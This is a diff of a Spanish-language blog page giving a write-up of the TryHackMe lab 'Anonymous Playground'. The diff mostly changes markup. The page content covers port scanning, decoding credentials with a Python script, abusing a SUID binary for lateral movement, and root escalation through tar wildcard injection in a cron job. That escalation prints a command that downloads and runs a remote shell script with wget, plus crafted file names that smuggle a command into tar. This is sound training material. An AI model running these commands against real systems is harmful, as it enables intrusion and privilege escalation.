@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Anonymous Playground es una maquina de TryHackMe, inicialmente presenta un reto que mediante un script obtuvimos las credenciales para acceder al servicio SSH. Realizamos una pequeña explotacion de un archivo suid para realizar movimiento lateral. Finalmente utilizamos wildcards con tar para escalar privilegios.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1656,11 +1656,11 @@
 </tr>
 </tbody>
 </table>
-<h1 id="nmap-">NMAP</h1>
+<h1 id="nmap">NMAP</h1>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1673,7 +1673,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Mon Aug 17 16:53:27 2020 as: nmap -Pn -sV -o mini_scan anonymous.thm</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Mon Aug 17 16:53:27 2020 as: nmap -Pn -sV -o mini_scan anonymous.thm</span>
 Nmap scan report <span class="k">for</span> anonymous.thm <span class="o">(</span>10.10.168.121<span class="o">)</span>
 Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -1686,25 +1686,25 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Mon Aug 17 16:54:24 2020 -- 1 IP address (1 host up) scanned in 57.27 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="http-">HTTP</h1>
+</div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-56-54.png" alt="image" /></p>
 <p>En la pagina <code>Operatives</code> se muestra una lista de posibles usuarios.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-59-54.png" alt="image" /></p>
 <p>En el codigo fuente de la imagen encontramos un comentario en el cual vemos una direccion de una pagina, dicha pagina no existe.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-57-54.png" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/anonymousplayground$ gobuster dir -u http://anonymous.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">250</span> -q -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/anonymousplayground$ gobuster dir -u http://anonymous.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">250</span> -q -x php,html,txt
 /index.php <span class="o">(</span>Status: 200<span class="o">)</span>
 /images <span class="o">(</span>Status: 301<span class="o">)</span>
 /js <span class="o">(</span>Status: 301<span class="o">)</span>
@@ -1719,24 +1719,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-25-16.png" alt="image" /></p>
 <p>Recargamos la pagina y ahora nos muestra el siguiente mensaje, al parecer es un mensaje codificado.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-26-19.png" alt="image" /></p>
-<h1 id="magna---user-">MAGNA - USER</h1>
+<h1 id="magna---user">MAGNA - USER</h1>
 <p>Intenamos con los diferentes bases y ciphers pero no logramos obtener ningun valor interesante, en la plataforma nos da una pista donde el valor <strong>zA</strong> es <strong>a</strong>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">You<span class="s1">&#39;re going to want to write a Python script for this. &#39;</span>zA<span class="s1">&#39; = &#39;</span>a<span class="err">&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">You<span class="s1">&#39;re going to want to write a Python script for this. &#39;</span>zA<span class="s1">&#39; = &#39;</span>a<span class="err">&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Podemos ver que <strong>zA = a</strong> eso quiere decir que cada par de letras tiene un valor, de tal forma que quedaria de la siguiente forma si reemplazamos <strong>zA</strong>, pero solo tenemos el valor de <strong>a</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gd">- hE zA dC fH zA::hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN
+<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gd">- hE zA dC fH zA::hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN
 </span><span class="gd"></span><span class="gi">+ hE a  dC fH a ::hE a  dC fH a  hA iJ a  eI aD jB cB hH gA a  fH fN
 </span></code></pre></td></tr></table>
 </div>
@@ -1744,12 +1744,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>En la primera parte tenemos 5 caracteres para un &ldquo;usuario&rdquo;, segun la pista la primera parte tiene dos <strong>a</strong> y entre los usuarios solo <code>magna</code> tiene la misma letra en la misma posision, por lo que el valor <code>hE</code> posiblemente pertenezca a <code>m</code> y asi con los valores siguientes.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gd">- hE zA dC fH zA
+<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gd">- hE zA dC fH zA
 </span><span class="gd"></span><span class="gi">+ hE a  dC fH a 
 </span><span class="gi">+ m  a  g  n  a
 </span></code></pre></td></tr></table>
@@ -1757,7 +1757,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><p>Escribimos un pequeño script el cual utiliza un numero (n) para poder encontrar la letra <code>m</code> (con <code>chr()</code>), utilizando los valores unicode del par de letras (con <code>ord()</code>), sumando el valor de cada uno de ellos y restando o sumando el numero (n).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1765,7 +1765,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">&gt;&gt;&gt; ord<span class="o">(</span><span class="s1">&#39;h&#39;</span><span class="o">)</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&gt;&gt;&gt; ord<span class="o">(</span><span class="s1">&#39;h&#39;</span><span class="o">)</span>
 <span class="m">104</span>
 &gt;&gt;&gt; ord<span class="o">(</span><span class="s1">&#39;E&#39;</span><span class="o">)</span>
 <span class="m">69</span>
@@ -1776,7 +1776,7 @@ chr<span class="o">(</span><span class="m">104</span> + <span class="m">69</span
 </div><p>Hay que tomar en cuenta que el valor <code>zA</code> es <code>a</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1801,7 +1801,7 @@ chr<span class="o">(</span><span class="m">104</span> + <span class="m">69</span
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python:AnonymousEncode.py" data-lang="python:AnonymousEncode.py"><span class="c1">#&#34;Credentials&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-python:AnonymousEncode.py" data-lang="python:AnonymousEncode.py"><span class="c1">#&#34;Credentials&#34;</span>
 <span class="n">encoded_cred</span> <span class="o">=</span> <span class="s2">&#34;hE zA dC fH zA&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
 
 <span class="c1">#USERS</span>
@@ -1822,19 +1822,19 @@ chr<span class="o">(</span><span class="m">104</span> + <span class="m">69</span
 	<span class="n">value</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;E&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span>	
 	<span class="k">if</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span><span class="mi">123</span><span class="p">):</span>
 		<span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;m&#34;</span><span class="p">:</span>
-			<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Posible numero: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-			<span class="k">print</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">encoded_cred</span><span class="p">))</span>
+			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Posible numero: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+			<span class="nb">print</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">encoded_cred</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Al ejecutar el script nos devuelve el numero que se puede utilizar para encontrar el valor de <code>m</code> el cual utilizamos para decodificar la primera parte, y el resultado fue magna.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/anonymousplayground$ python creds.py 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/anonymousplayground$ python creds.py 
 Posible numero: <span class="m">64</span>
 magna
 </code></pre></td></tr></table>
@@ -1842,23 +1842,23 @@ magna
 </div><p>Realizamos lo mismo pero ahora con la segunda parte:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">encoded_cred_two</span> <span class="o">=</span> <span class="s2">&#34;hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">encoded_cred_two</span> <span class="o">=</span> <span class="s2">&#34;hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
 <span class="n">encoded_cred</span> <span class="o">=</span> <span class="s2">&#34;hE zA dC fH zA&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">encoded_cred</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;::&#34;</span> <span class="o">+</span> <span class="n">decode</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">encoded_cred_two</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">encoded_cred</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;::&#34;</span> <span class="o">+</span> <span class="n">decode</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">encoded_cred_two</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Utilizamos estas &ldquo;credenciales&rdquo; en el servicio SSH y logramos obtener una shell y nuestra primera <code>flag.txt</code>.</p>
 <p><img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-09-33.png" alt="image" /></p>
-<h1 id="user---spooky-">USER - SPOOKY</h1>
+<h1 id="user---spooky">USER - SPOOKY</h1>
 <p>En la carpeta principal encontramos una nota en el cual indica que <code>Spooky</code> hizo un binario en <code>C</code> y que en la maquina esta installado radare2 y gdb para poder realizarle un reversing:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1869,7 +1869,7 @@ magna
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash:note_from_spooky.txt" data-lang="bash:note_from_spooky.txt">Hey Magna,
+<pre tabindex="0" class="chroma"><code class="language-bash:note_from_spooky.txt" data-lang="bash:note_from_spooky.txt">Hey Magna,
 
 Check out this binary I made!  I&#39;ve been practicing my skills in C so that I can get better at Reverse
 Engineering and Malware Development.  I think this is a really good start.  See if you can break it!
@@ -1885,7 +1885,7 @@ Spooky
 <p>Utilizamos <code>radare2</code>, vemos varias funciones interesantes como <code>sym.main</code> y <code>sym.call_bash</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1908,7 +1908,7 @@ Spooky
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; afl
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; afl
 0x00400000    <span class="m">3</span> <span class="m">72</span>   -&gt; <span class="m">73</span>   sym.imp.__libc_start_main
 0x004004e0    <span class="m">3</span> <span class="m">23</span>           sym._init
 0x00400510    <span class="m">1</span> <span class="m">6</span>            sym.imp.puts
@@ -1934,7 +1934,7 @@ Spooky
 </div><p>En <code>sym.main</code> vemos que simplemente realiza una impresion y pregunta por algo.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1959,7 +1959,7 @@ Spooky
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; pdf @sym.main
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; pdf @sym.main
             <span class="p">;</span>-- main:
 / <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">56</span>
 <span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
@@ -1987,7 +1987,7 @@ Spooky
 </div><p>En <code>sym.call_bash</code> vemos que realiza varias impresiones y al final ejecuta <code>/bin/sh</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2020,7 +2020,7 @@ Spooky
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; pdf @sym.call_bash
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400570<span class="o">]</span>&gt; pdf @sym.call_bash
 / <span class="o">(</span>fcn<span class="o">)</span> sym.call_bash <span class="m">129</span>
 <span class="p">|</span>   sym.call_bash <span class="o">()</span><span class="p">;</span>
 <span class="p">|</span>           0x00400657      <span class="m">55</span>             push rbp
@@ -2056,7 +2056,7 @@ Spooky
 </div><p>Para entenderlo con más claridad utilizamos <code>Ghidra</code> y vemos el codigo fuente de ambas funciones, en main vemos que el valor de la variable <code>local_48</code> tiene un tamaño de 64 y la segunda funcion simplemente realiza impresiones y una ejecucion:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2067,7 +2067,7 @@ Spooky
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C:main.c" data-lang="C:main.c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-C:main.c" data-lang="C:main.c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
@@ -2080,7 +2080,7 @@ Spooky
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2099,7 +2099,7 @@ Spooky
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C:call_bash.c" data-lang="C:call_bash.c"><span class="kt">void</span> <span class="nf">call_bash</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-C:call_bash.c" data-lang="C:call_bash.c"><span class="kt">void</span> <span class="nf">call_bash</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">We are Anonymous.&#34;</span><span class="p">);</span>
@@ -2122,18 +2122,18 @@ Spooky
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-32-48.png" alt="image" /></p>
 <p>Logramos obtener una shell con el usuario <code>Spooky</code>.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-49-08.png" alt="image" /></p>
-<h1 id="privilege-escalation-">PRIVILEGE ESCALATION</h1>
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
 <p>Hacemos una pequeña enumeracion en el archivo <code>/etc/crontab</code> y encontramos que existe un cron que es ejecutado por el usuario <code>root</code> el cual realiza un backup de todo lo que se encuentre en <code>/home/spooky</code>.<br />
 <img src="/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-54-19.png" alt="image" /></p>
 <p>Utilizamos los &ldquo;parametros&rdquo; para explotar esta vulnerabilidad creando un archivo que contenga nuestra shell inversa, y creamos los &ldquo;parametros&rdquo; los cuales van a ejecutar nuestra shell al igual que en la maquina <a href="https://sckull.github.io/posts/cmess/#shell---root"><strong>CMESS - THM</strong></a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;bash -c  &#34;$(wget -qO- http://10.2.29.162/shell.sh)&#34; &#39;</span> &gt; shell.sh
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;bash -c  &#34;$(wget -qO- http://10.2.29.162/shell.sh)&#34; &#39;</span> &gt; shell.sh
 <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s2">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
 <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; --checkpoint<span class="o">=</span><span class="m">1</span>
 </code></pre></td></tr></table>
@@ -2415,7 +2415,7 @@ Spooky
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3529,15 +3529,15 @@ var a = document.getElementsByClassName('navbar__menu-item')
           <nav id="TableOfContents">
   <ul>
     <li><a href="#room">Room</a></li>
-    <li><a href="#nmap-">NMAP</a></li>
-    <li><a href="#http-">HTTP</a>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
-    <li><a href="#magna---user-">MAGNA - USER</a></li>
-    <li><a href="#user---spooky-">USER - SPOOKY</a></li>
-    <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
+    <li><a href="#magna---user">MAGNA - USER</a></li>
+    <li><a href="#user---spooky">USER - SPOOKY</a></li>
+    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
   </ul>
 </nav>          
         </div>
